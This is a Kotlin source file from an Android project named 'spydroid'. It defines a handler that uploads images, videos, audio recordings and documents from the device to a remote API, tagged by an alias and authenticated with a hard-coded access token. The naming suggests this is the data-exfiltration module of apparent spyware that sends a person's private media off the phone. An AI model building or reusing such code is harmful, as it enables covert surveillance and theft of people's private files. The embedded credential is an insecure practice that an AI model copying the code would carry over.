package net.spydroid.common.remote.network.data

import android.content.Context
import android.util.Log
import net.spydroid.common.remote.network.daos.UploadFilesDao
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File

class UploadFilesDaoHandler : UploadFilesDao {
    override fun insertFile(
        context: Context,
        file: File,
        type: String,
        alias: String
    ) {

        val TAG = "UPLOAD_FILES"
        try {
            val access_token = "iygad7618wg8y1f7fgvas71f671"
            val requestFile = file.asRequestBody("multipart/form-data".toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, requestFile)
            val description = "file".toRequestBody(MultipartBody.FORM)

            when (type) {
                "IMAGE" -> {
                    val response = apiService.uploadImage(
                        accessToken = access_token,
                        alias = alias,
                        file = body,
                        description = description
                    ).execute()

                    if (response.isSuccessful) {
                        Log.i(TAG, "Image upload is Successful")
                    } else {
                        Log.e(TAG, "Image error uploading")
                    }
                }

                "VIDEO" -> {
                    val response = apiService.uploadVideo(
                        accessToken = access_token,
                        alias = alias,
                        file = body,
                        description = description
                    ).execute()

                    if (response.isSuccessful) {
                        Log.i(TAG, "Video upload is Successful")
                    } else {
                        Log.e(TAG, "Video error uploading")
                    }
                }

                "AUDIO" -> {
                    val response = apiService.uploadAudio(
                        accessToken = access_token,
                        alias = alias,
                        file = body,
                        description = description
                    ).execute()

                    if (response.isSuccessful) {
                        Log.i(TAG, "Audio upload is Successful")
                    } else {
                        Log.e(TAG, "Audio error uploading")
                    }
                }

                "DOCUMENT" -> {
                    val response = apiService.uploadDocument(
                        accessToken = access_token,
                        alias = alias,
                        file = body,
                        description = description
                    ).execute()

                    if (response.isSuccessful) {
                        Log.i(TAG, "Document upload is Successful")
                    } else {
                        Log.e(TAG, "Document error uploading")
                    }
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
        }
    }
}